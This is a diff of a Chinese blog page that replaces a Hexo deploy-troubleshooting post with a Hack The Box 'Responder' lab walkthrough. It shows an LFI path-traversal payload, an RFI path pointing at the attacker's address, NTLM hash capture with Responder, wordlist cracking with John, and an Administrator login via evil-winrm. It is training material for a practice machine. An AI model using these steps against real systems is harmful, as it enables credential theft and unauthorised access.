@@ -9,7 +9,7 @@
     
     <title>
         
-            hexo d Error:Spawn failed 问题解决办法 |
+            Hack the box: Responder |
         
         House of Mango
     </title>
@@ -181,7 +181,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        hexo d Error:Spawn failed 问题解决办法
+                        Hack the box: Responder
                     </div>
                 
 
@@ -207,12 +207,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-01-25 20:41:01</span>
+                <span class="datetime">2024-01-28 14:42:31</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Thu Jan 25 2024 20:50:04 GMT+0800">2024-01-25 20:50:04</span>
+                <span class="datetime" data-updated="Sun Jan 28 2024 14:52:27 GMT+0800">2024-01-28 14:52:27</span>
             </span>
         
 
@@ -220,7 +220,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li>
+                            <li class="category-item"><a href="/categories/pentest/">pentest</a></li>
                         
                     
                 </ul>
@@ -232,10 +232,7 @@
                 <i class="icon fas fa-tags"></i>&nbsp;
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Error/">Error</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hexo/">hexo</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hack-the-box/">hack the box</a></li>
                         
                     
                 </ul>
@@ -263,30 +260,89 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <p><code>hexo d</code>失败好几天了，网上大部分的解决办法是重置<code>.deploy_git</code>文件夹，但是对我没有用。</p>
-<p>尝试了ping github.com，超时。</p>
-<p><code>ssh -T git@github.com</code> ，失败。</p>
-<p>感觉应该是网络问题，但是更换了不同的网络，换了代理，换了代理端口，都还是不行。</p>
-<p>最后是更换了ssh的端口成功解决问题了。</p>
-<ol>
-<li><p>进入~&#x2F;.ssh（在win下使用git bash可以使用cd和vim编辑器）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>创建一个config文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>编辑文件内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>保存退出(:wq)</p>
-</li>
-<li><p>检查是否成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>最后就成功hexo d啦~~~</p>
+                    <p>惯例先扫一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- -T4 10.129.184.194</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-sC</code>：此选项启用默认脚本扫描。Nmap包含各种脚本，可用于在扫描期间执行各种任务，如检测常见漏洞、枚举有关目标的信息等。</li>
+<li><code>-sV</code>：此选项启用版本检测。Nmap将尝试确定运行在开放端口上的服务的版本。</li>
+<li><code>-p-</code>：这个选项告诉Nmap扫描所有的端口，而不仅仅是常见的端口。 <code>-p-</code> 表示扫描所有65535个端口。</li>
+<li><code>-T4</code>：这个选项设置扫描的速度&#x2F;敏感度。<code>-T4</code> 表示设置为“Aggressive”模式，这意味着扫描速度较快，但也更容易被目标检测到。</li>
+</ul>
+<img     src="/pic/Responder.assets/image-20240128132727856.png"   alt="image-20240128132727856" >
+
+<h3 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h3><p>被重定向到unika.htb.</p>
+<p>添加到hosts文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<img     src="/pic/Responder.assets/image-20240128133132583.png"   alt="image-20240128133132583" >
+
+<p>正常访问</p>
+<img     src="/pic/Responder.assets/image-20240128133349577.png"   alt="image-20240128133349577" >
+
+<h3 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h3><p>scripting language</p>
+<p>在nmap的扫描结果可以发现是php</p>
+<h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h3><p>语言，page</p>
+<img     src="/pic/Responder.assets/image-20240128133655887.png"   alt="image-20240128133655887" >
+
+<h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><p>Local File Include (LFI)</p>
+<p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts</p>
+<h3 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h3><p>Remote File Include (RFI)</p>
+<p>&#x2F;&#x2F;10.10.14.6&#x2F;somefile</p>
+<h3 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h3><p>NTLM stand for : </p>
+<p>New Technology LAN Manager</p>
+<p>基于挑战&#x2F;应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</p>
+<h3 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h3><p>Responder 是一个在网络渗透测试和攻击中使用的工具，它可以用于执行 LLNMR（Link-Local Multicast Name Resolution）欺骗攻击，获取目标系统上的用户名和哈希密码。这个工具特别适用于局域网（LAN）环境。</p>
+<p>具体来说，Responder 可以监听和响应 NetBIOS 响应请求，向目标系统发送伪造的 NetBIOS 响应，诱使目标系统发送验证请求，从而获取用户的 NTLMv2 哈希密码。这种攻击方式通常用于获取用户凭据，进行后续的横向移动或其他恶意活动。</p>
+<img     src="/pic/Responder.assets/image-20240128134641484.png"   alt="image-20240128134641484" >
+
+<h3 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h3><p>John the Ripper</p>
+<p>用于破解NTLM的哈希</p>
+<h3 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<img     src="/pic/Responder.assets/image-20240128135628905.png"   alt="image-20240128135628905" >
+
+<p>监听本地网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<img     src="/pic/Responder.assets/image-20240128135512482.png"   alt="image-20240128135512482" >
+
+<p>访问</p>
+<img     src="/pic/Responder.assets/image-20240128135741322.png"   alt="image-20240128135741322" >
+
+<p>responder捕获了hash</p>
+<img     src="/pic/Responder.assets/image-20240128135831533.png"   alt="image-20240128135831533" >
+
+<p>把获取到的hash保存到一个文件</p>
+<img     src="/pic/Responder.assets/image-20240128135936528.png"   alt="image-20240128135936528" >
+
+<p>kali中自带了一些字典，都保存在<code>/usr/share/wordlists</code>,这里我们使用rockyou.txt</p>
+<p>解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>
+
+<p>使用john爆破，尝试许多不同的常见密码，看看是否有任何密码生成相同的质询响应，如果找到一个，我们就知道这就是密码。这通常被称为哈希破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<img     src="/pic/Responder.assets/image-20240128140427831.png"   alt="image-20240128140427831" >
+
+<p>得到了密码：badminton</p>
+<h3 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h3><p>我们将使用Windows服务(即在盒子上运行)使用我们恢复的密码远程访问Responder机器。它监听哪个TCP端口?</p>
+<p>nmap扫一下，5985</p>
+<h3 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h3><p>要找flag了。5985搜索后可以得知有一款Windows远程管理Shell工具evil-winrm。这是一款远程渗透工具。教程可以看<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/w1304099880/article/details/106843786/" >https://blog.csdn.net/w1304099880/article/details/106843786/<i class="fas fa-external-link-alt"></i></a></p>
+<p>kali中已经自带了</p>
+<p>这里我换了一个靶机，所以ip有变化。靶机ip为10.129.164.148</p>
+<p>使用evil-winrm</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.164.148 -u Administrator -p badminton</span><br></pre></td></tr></table></figure>
+
+<img     src="/pic/Responder.assets/image-20240128143851953.png"   alt="image-20240128143851953" >
+
+<p>翻一下</p>
+<img     src="/pic/Responder.assets/image-20240128143832594.png"   alt="image-20240128143832594" >
+
+
+
 <p>参考：</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41287260/article/details/124368189" >https://blog.csdn.net/weixin_41287260/article/details/124368189<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.zhheo.com/p/128998ac.html" >https://blog.zhheo.com/p/128998ac.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://daniel-schwarzentraub.medium.com/htb-tier-1-starting-point-responder-3ff5bca2a522" >https://daniel-schwarzentraub.medium.com/htb-tier-1-starting-point-responder-3ff5bca2a522<i class="fas fa-external-link-alt"></i></a></p>
 
                 </div>
 
@@ -298,11 +354,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Error/">Error</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/hexo/">hexo</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/hack-the-box/">hack the box</a>
                                     </li>
                                 
                             </ul>
@@ -318,31 +370,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/01/28/Hack-the-box-Responder/"
-                                   title="Hack the box: Responder"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Hack the box: Responder</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/01/19/pwn%E7%BB%83%E4%B9%A01/"
-                                   title="pwn练习1"
+                                   href="/2024/01/25/hexo%20d%20ErrorSpawn%20failed%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"
+                                   title="hexo d Error:Spawn failed 问题解决办法"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">pwn练习1</span>
+                                        <span class="post-nav-title-item text-ellipsis">hexo d Error:Spawn failed 问题解决办法</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -370,7 +406,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-1"><span class="nav-text">Task 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-2"><span class="nav-text">Task 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3"><span class="nav-text">Task 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-4"><span class="nav-text">Task 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-5"><span class="nav-text">Task 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-6"><span class="nav-text">Task 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-7"><span class="nav-text">Task 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-8"><span class="nav-text">Task 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-9"><span class="nav-text">Task 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-10"><span class="nav-text">Task 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-11"><span class="nav-text">Task 11</span></a></li></ol>
     </div>
 </div>
 
@@ -539,7 +575,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-1"><span class="nav-text">Task 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-2"><span class="nav-text">Task 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3"><span class="nav-text">Task 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-4"><span class="nav-text">Task 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-5"><span class="nav-text">Task 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-6"><span class="nav-text">Task 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-7"><span class="nav-text">Task 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-8"><span class="nav-text">Task 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-9"><span class="nav-text">Task 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-10"><span class="nav-text">Task 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-11"><span class="nav-text">Task 11</span></a></li></ol>
     </div>
 </div>
 
